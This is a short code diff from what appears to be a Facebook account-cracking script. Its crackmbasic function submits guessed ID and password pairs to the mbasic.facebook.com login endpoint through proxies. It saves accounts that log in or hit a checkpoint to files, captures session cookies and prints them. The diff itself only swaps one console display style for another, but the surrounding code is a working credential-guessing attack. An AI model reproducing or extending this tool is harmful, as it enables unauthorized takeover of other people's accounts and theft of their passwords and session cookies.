@@ -1808,9 +1808,8 @@ def crackmbasic(idf,pwv):
 
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				tree = Tree(f" ")
-				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}")
-				cetak(tree)
+				cetak(panel(f"[bold yellow]{idf}|{pw}",width=50,title=f"[bold red][[bold green] ID & PW[bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold yellow]{ua}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1819,9 +1818,9 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f"  ")
-				tree.add(f"[ Succes-Login ]").add(f"[bold green]{idf}|{pw}").add(f"[bold green]{kuki}")
-				cetak(tree)
+				cetak(panel(f"[bold green]{idf}|{pw}",width=50,title=f"[bold red][[bold green] ID & PW[bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=70,title=f"[bold red][[bold green] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
